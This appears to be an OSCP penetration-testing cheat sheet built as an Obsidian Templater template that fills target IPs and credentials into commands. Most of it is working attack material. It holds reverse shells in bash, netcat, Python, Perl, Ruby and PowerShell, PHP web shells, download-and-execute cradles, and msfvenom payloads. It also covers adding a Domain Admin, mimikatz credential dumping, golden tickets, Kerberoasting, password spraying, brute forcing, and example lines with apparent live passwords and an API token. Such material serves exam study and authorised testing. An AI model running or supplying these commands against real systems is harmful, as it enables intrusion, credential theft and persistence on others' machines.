OSCP

I used the Templater community plugin in obsidian to automatically populate IP,username,password Thanks siddicky for this cool idea!

I do have plans to actively maintain it if people like it

https://www.youtube.com/watch?v=2NLi4wzAvTw&t=634s

Have a look at this video, if youre wondering what im talking about!

Steps to use-

1-> Download obsidian, click on settings and browse "community plugins"

2-> Install the Templater plugin by SilentVoid and enable the plugin

3-> Copy the template and save

4->Create a new .md file and put in your desired values



```
hyphenhyphenhyphen

LHOST: 1.1.1.1
RHOST: 0.0.0.0
USERNAME: username
PASSWORD: password
DOMAIN: domain

hyphenhyphenhyphen

```

Always make sure you have source mode enabled, else this wont work!
![test](https://media.discordapp.net/attachments/1146454908539769002/1149737116167852122/image.png?width=1602&height=720)

![test](https://cdn.discordapp.com/attachments/1125391842125549601/1149407842885980190/image.png)



5->press alt+e and select your template name

BOOM

To change the IP, i would either prefer ctrl + z or just create a new file with the method above ^

## Shells & stuff
https://www.revshells.com/

```bash

# Get-NTLM from password
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<% tp.frontmatter["PASSWORD"] %>".encode("utf-16le")).digest())'


powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatter["LHOST"] %>:<LPORT>/Invoke-PowerShellTcp.ps1')"


# php cmd 

<?php $cmd=$_GET['cmd']; system($cmd);?>
<?php echo shell_exec("wget [http://IP/reverse.sh](http://IP/reverse.sh) -O /tmp/reverseshell.sh");?>
<?php echo shell_exec("chmod 777 /tmp/reverseshell.sh");?>
<?php echo shell_exec("/bin/bash /tmp/reverseshell.sh");?>

<pre>
<?php
	system([$_GET['cmd']]);
?>
</pre>

#enabling RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0**

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"


# ConPtyShell
https://github.com/antonioCoco/ConPtyShell
stty raw -echo

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Others/ConPtyShell/Invoke-ConPtyShell.ps1
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Others/ConPtyShell/ConPtyShell.exe


. ./Invoke-ConPtyShell.ps1
# exe
stty raw -echo; (stty size; cat) | nc -lvnp 3001
Invoke-ConPtyShell <% tp.frontmatter["LHOST"] %> 3001
./ConPtyShell.exe <% tp.frontmatter["LHOST"] %> 3001

#manual upgrade
Invoke-ConPtyShell -Upgrade -Rows 23 -Cols 115


# Execute Command as another user
PS C:\> $SecurePassword = ConvertTo-SecureString '<% tp.frontmatter["PASSWORD"] %>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<% tp.frontmatter["USERNAME"] %>', $SecurePassword)
PS C:\> $Session = New-PSSession -Credential $Cred
PS C:\> Invoke-Command -Session $session -scriptblock { whoami }

or
$username = '<% tp.frontmatter["USERNAME"] %>'
$password = '<% tp.frontmatter["PASSWORD"] %>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential

powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


# Add new Domain Admin
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <% tp.frontmatter["PASSWORD"] %>
New-ADUser -Name "<% tp.frontmatter["USERNAME"] %>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <% tp.frontmatter["USERNAME"] %>

#Execute Command in User Context
$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}

#Execute Scripts with Creds (Reverse Shell)
$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<% tp.frontmatter["LHOST"] %>/<FILE>.ps1') } -Credential $cred


```


## Reverse shell
```bash

#reverse shell
bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"' | base64

# curl Reverse shell
curl --header "Content-Type: application/json" --request POST http://<% tp.frontmatter["RHOST"] %>:<RPORT>/upload --data '{"auth": {"name": "<% tp.frontmatter["USERNAME"] %>", "password": "<% tp.frontmatter["PASSWORD"] %>"}, "filename" : "& echo "bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"|base64 -d|bash"}'

#mkfifo Reverse shell
mkfifo /tmp/shell; nc <% tp.frontmatter["LHOST"] %> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell

#netcat reverse shell
nc -e /bin/sh <% tp.frontmatter["LHOST"] %> <LPORT>

#perl reverse shell
perl -e 'use Socket;$i="<% tp.frontmatter["LHOST"] %>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#PHP reverse shell
php -r '$sock=fsockopen("<% tp.frontmatter["LHOST"] %>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

#msfvenom 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f dll -o reverse.dll

#Powershell Reverse shell
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Text = '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

#python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'

#ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("<% tp.frontmatter["LHOST"] %>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# nishang
cd path/to/nishang/Shells/
cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LPORT>

```

## File Sharing
```bash
## File Sharing

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/reverse.exe
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Linux/linpeas.sh
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/mimikatz/mimikatz.exe
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/exe/winPEASany.exe

c:/users/public/


impacket-smbserver test /home/rachit -smb2support -user joe -password joe
net use m: \\<% tp.frontmatter["LHOST"] %>\test /user:joe joe /persistent:yes
copy * \\<% tp.frontmatter["LHOST"] %>\test
smbserver.py -smb2support test .


iwr -uri <% tp.frontmatter["LHOST"] %>:8000/<FILE> -Outfile <FILE>
IEX(IWR http://<% tp.frontmatter["LHOST"] %>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<% tp.frontmatter["LHOST"] %>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)


wget http://<% tp.frontmatter["LHOST"] %>/<FILE>
wget -r --no-parent http://<% tp.frontmatter["LHOST"] %>/<FILE>
wget -m http://<% tp.frontmatter["LHOST"] %>/<FILE>

curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>

#MSF
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -f exe -o <FILE>.exe

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
LHOST => <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run

.\<FILE>.exe

meterpreter > download *
```



## Tools
```bash
# nmapAutomator
./nmapAutomator.sh -H  <% tp.frontmatter["RHOST"] %> -T All

#nmap
sudo nmap -A -T4 -sC -sV -p- <% tp.frontmatter["RHOST"] %>
sudo nmap -sV -sU <% tp.frontmatter["RHOST"] %>
sudo nmap -A -T4 -sC -sV --script vuln <% tp.frontmatter["RHOST"] %>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <% tp.frontmatter["RHOST"] %>
sudo nmap -sC -sV -p- --scan-delay 5s <% tp.frontmatter["RHOST"] %>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <% tp.frontmatter["RHOST"] %>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb

# evil-winrm
evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -p '<% tp.frontmatter["PASSWORD"] %>'
evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -H ''

# xfreerdp
xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /p:<% tp.frontmatter["PASSWORD"] %> /dynamic-resolution +clipboard
xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /d:<% tp.frontmatter["DOMAIN"] %> /pth:'<HASH>' /dynamic-resolution +clipboard

# smbclient
smbclient -L \\<% tp.frontmatter["RHOST"] %>\ -N
smbclient -L //<% tp.frontmatter["RHOST"] %>/ -N
smbclient -L ////<% tp.frontmatter["RHOST"] %>/ -N
smbclient -U "<% tp.frontmatter["USERNAME"] %>" -L \\\\<% tp.frontmatter["RHOST"] %>\\
smbclient -L //<% tp.frontmatter["RHOST"] %>// -U <% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>
smbclient //<% tp.frontmatter["RHOST"] %>/SYSVOL -U <% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>
smbclient "\\\\<% tp.frontmatter["RHOST"] %>\<SHARE>"
smbclient \\\\<% tp.frontmatter["RHOST"] %>\\<SHARE> -U '<% tp.frontmatter["USERNAME"] %>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<% tp.frontmatter["RHOST"] %>/<SHARE>
mount.cifs //<% tp.frontmatter["RHOST"] %>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v

mask""
recurse ON
prompt OFF
mget *


# snmpwalk 
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %>
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> .1
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> nsExtendObjects
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.6.3.1.2

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports


# crackmapexec

# Dont forget to use
--local-auth

crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares -M spider_plus
crackmapexec ssh <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
crackmapexec ftp <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" 
crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success

# Kerbrute
./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>


#ldap
ldapsearch -x -w <% tp.frontmatter["PASSWORD"] %>
ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -s base namingcontexts
ldapsearch -x -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/dn: / {print $2}'
ldapsearch -x -D "cn=admin,dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" -s sub "cn=*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/uid: /{print $2}' | nl
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -D "<% tp.frontmatter["USERNAME"] %>"  -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<% tp.frontmatter["DOMAIN"] %> -b "DC=<% tp.frontmatter["DOMAIN"] %>,DC=local" > <FILE>.txt

<examples>

ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb

<examples>


# Get computers
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --computers
# Get groups
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --groups
# Get users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
# Get Domain Admins
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
# Get Privileged Users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --privileged-users


#powercat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<% tp.frontmatter["LHOST"] %>/powercat.ps1');powercat -c <% tp.frontmatter["LHOST"] %> -p <LPORT> -e cmd"

#adpeas
Import-Module .\adPEAS.ps1
. .\adPEAS.ps1
Invoke-adPEAS
Invoke-adPEAS -Domain '<% tp.frontmatter["DOMAIN"] %>' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor

#### Certipy
certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["DOMAIN"] %> -p <% tp.frontmatter["PASSWORD"] %>
certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %> -p <% tp.frontmatter["PASSWORD"] %> -vulnerable -stdout

#rpcclient
rpcclient -U "" <% tp.frontmatter["RHOST"] %>

# msfvenom && metasploit execution
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > set LPORT <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > run

.\exploit.exe
```


## Pivoting
```bash
#ligolo

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/Ligolo/agent.exe

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
 # LHOST machine
./proxy -selfcert
# RHOST machine
./agent -ignore-cert -connect <% tp.frontmatter["LHOST"] %>:11601
./agent.exe -ignore-cert -connect <% tp.frontmatter["LHOST"] %>:11601
#route
sudo ip route add x.x.x.x dev ligolo

help command
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:7777 --tcp


#chisel
#Run command on attacker machine
chisel server -p 8001 --reverse
#Run command on Web Server machine
 .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
and edit the proxychains with the port that chisel provided
```


## Protocols
```
# SSH
ssh user@<% tp.frontmatter["RHOST"] %> -oKexAlgorithms=+diffie-hellman-group1-sha1
ssh -i key.pem user@<% tp.frontmatter["RHOST"] %>

../../../../../../../../../home/<% tp.frontmatter["USERNAME"] %>/.ssh/id_rsa

hydra -v -V -u -L users -P password -t 1 -u <% tp.frontmatter["RHOST"] %>  ssh

#FTP
wget-m --no-passive ftp://<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["LHOST"] %>
wget -r ftp://<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@example.com/remote/dir/

```

``
## Fuzzing/Bruteforcing
```bash

# common file extensions
txt,bak,php,html,js,asp,aspx

# common picture extensions
png,jpg,jpeg,gif,bmp

# feroxbuster
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  --url http://<% tp.frontmatter["RHOST"] %>/  -x php,aspx,jsp,pdf  -C 404,401,403 --output brute.txt

# Gobuster
gobuster dir -u http://<% tp.frontmatter["RHOST"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# API Fuzzing
ffuf -u https://<% tp.frontmatter["RHOST"] %>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412

# File Extensions
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<% tp.frontmatter["RHOST"] %>/cd/ext/logs/FUZZ -e .log

# Searching for LFI
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<% tp.frontmatter["RHOST"] %>/admin../admin_staging/index.php?page=FUZZ -fs 15349

# WPScan
wpscan --url https://<% tp.frontmatter["RHOST"] %> --enumerate u,t,p
wpscan --url https://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive
wpscan --url https://<% tp.frontmatter["RHOST"] %> --disable-tls-checks
wpscan --url https://<% tp.frontmatter["RHOST"] %> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<% tp.frontmatter["RHOST"] %> -U <% tp.frontmatter["USERNAME"] %> -P passwords.txt -t 50
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive

<example>
wpscan --url [http://192.168.243.244](http://192.168.243.244) --enumerate p --plugins-detection aggressive  --api-token qLVQId1c9vb4suVQzft2zhHusr9BsSaSpxcanRW6qSA
<example>



# Hydra
hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"

sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>

#crowbar
#  RDP brute forcing a single IP address using a single username and a single password:
./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -u admin -c Aa123456
 # username list and a single password
 ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -U ~/Desktop/userlist -c passw0rd
 # username and a single password list
  ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -u localuser -C ~/Desktop/passlist
 # username list and password list
 ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/24 -U ~/Desktop/userlist -C ~/Desktop/passlist -d
```


### Cracking 
```bash
# Hashcat

Asrep Roast
hashcat -m 18200 -a 0 <FILE> <FILE>
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 18200-a 0asrep.txt passwords.txt --outfile asrepcrack.txt --forcehashcat

Kerberoast 
hashcat -m 13100 --force <FILE> <FILE>
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


#keypass
keepass2<% tp.frontmatter["USERNAME"] %> Database.kdbx > keepass.hash
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

#id_rsa
ssh2<% tp.frontmatter["USERNAME"] %> id_rsa > ssh.hash
hashcat -h | grep -i "ssh"
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt

#ntlm
hashcat --help | grep -i "ntlm"
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

#ntlmv2
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

```




## Mimikatz & bloodhound & Rubeus
```powershell
https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49

# mimikatz
privilege::debug
token::elevate
lsadump::sam
lsadump::lsa
lsadump::secrets
sekurlsa::logonpasswords
lsadump::cache

.\mimikatz "privilege::debug" "token::elevate"  "lsadump::sam " exit
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords

Generate TGT with NTLM
kerberos::golden /domain:<% tp.frontmatter["DOMAIN"] %>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<% tp.frontmatter["USERNAME"] %>

Inject TGT with Mimikatz
kerberos::ptt <KIRBI_FILE>

# bloodhound
bloodhound-python -d <% tp.frontmatter["DOMAIN"] %> -u <% tp.frontmatter["USERNAME"] %> -p "<% tp.frontmatter["PASSWORD"] %>" -gc <% tp.frontmatter["DOMAIN"] %> -c all -ns <% tp.frontmatter["RHOST"] %>
bloodhound-python -u <% tp.frontmatter["USERNAME"] %> -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %> -ns <% tp.frontmatter["RHOST"] %> -c All
bloodhound-python -u <% tp.frontmatter["USERNAME"] %> -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %> -dc <% tp.frontmatter["RHOST"] %> -ns <% tp.frontmatter["RHOST"] %> --dns-tcp -no-pass -c ALL --zip


# Rubeus

Overpass the hash
Rubeus.exe kerberoast /user:<% tp.frontmatter["USERNAME"] %>

Pass the hash
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials

RunasCs
./RunasCs.exe -l 3 -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' 'C:\Users\<% tp.frontmatter["USERNAME"] %>\Downloads\<FILE>.exe'
./RunasCs.exe -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' cmd.exe -r <% tp.frontmatter["LHOST"] %>:<LPORT>

winexe
